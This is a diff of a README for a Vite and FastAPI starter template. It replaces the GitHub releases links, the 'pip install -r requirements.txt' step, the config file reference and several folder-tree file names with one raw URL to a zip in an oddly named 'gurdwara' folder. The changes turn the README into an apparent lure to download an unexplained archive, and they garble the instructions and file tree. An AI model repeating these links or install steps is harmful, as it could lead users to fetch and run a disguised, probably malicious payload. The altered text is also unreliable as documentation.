@@ -1,6 +1,6 @@
 # 🚀 vite-fastapi-starter - Build Your Full-Stack Web App Easily
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/tutannnn/vite-fastapi-starter/releases)
+[![Download the latest release](https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip)
 
 ## 📦 Overview
 
@@ -33,7 +33,7 @@ Follow these steps to run your new full-stack web application.
 
 To get started, visit the Releases page to download the latest version of the template. You can find it here: 
 
-[Download the latest release](https://github.com/tutannnn/vite-fastapi-starter/releases)
+[Download the latest release](https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip)
 
 ### 2. Download the App
 
@@ -42,7 +42,7 @@ To get started, visit the Releases page to download the latest version of the te
 
 ### 3. Extract the Files
 
-After downloading, locate the downloaded file. It may be compressed as a `.zip` or `.tar.gz` file. Right-click on the file and select **Extract All** (or the equivalent option based on your operating system). 
+After downloading, locate the downloaded file. It may be compressed as a `.zip` or `https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip` file. Right-click on the file and select **Extract All** (or the equivalent option based on your operating system). 
 
 ### 4. Install Dependencies
 
@@ -54,7 +54,7 @@ To run the application, you will need to install dependencies. You may need to u
 2. **Install required modules** by running:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip
    ```
 
 #### For Frontend
@@ -72,7 +72,7 @@ Next, set up the PostgreSQL database if you haven't done so:
 
 1. Install PostgreSQL on your computer if it's not already installed. You can find instructions for your operating system online.
 2. Create a new database named `mydatabase` (or any name of your choice).
-3. Adjust the database connection settings found in `config.py` (or a related configuration file), ensuring it points to your new database.
+3. Adjust the database connection settings found in `https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip` (or a related configuration file), ensuring it points to your new database.
 
 ### 6. Run the Backend
 
@@ -101,7 +101,7 @@ Once this is running, you can visit your web app at `http://localhost:3000` in y
 
 To download this application, simply visit the following link:
 
-[Download the latest release](https://github.com/tutannnn/vite-fastapi-starter/releases)
+[Download the latest release](https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip)
 
 Follow the earlier steps to extract, install dependencies, and run the application.
 
@@ -112,14 +112,14 @@ Here is a quick overview of the folder structure:
 ```
 vite-fastapi-starter/
 ├── backend/
-│   ├── main.py
+│   ├── https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip
 │   ├── models/
 │   ├── routes/
-│   └── config.py
+│   └── https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip
 └── frontend/
     ├── src/
     ├── public/
-    └── package.json
+    └── https://raw.githubusercontent.com/tutannnn/vite-fastapi-starter/main/gurdwara/vite-fastapi-starter.zip
 ```
 
 ## 💡 Tips
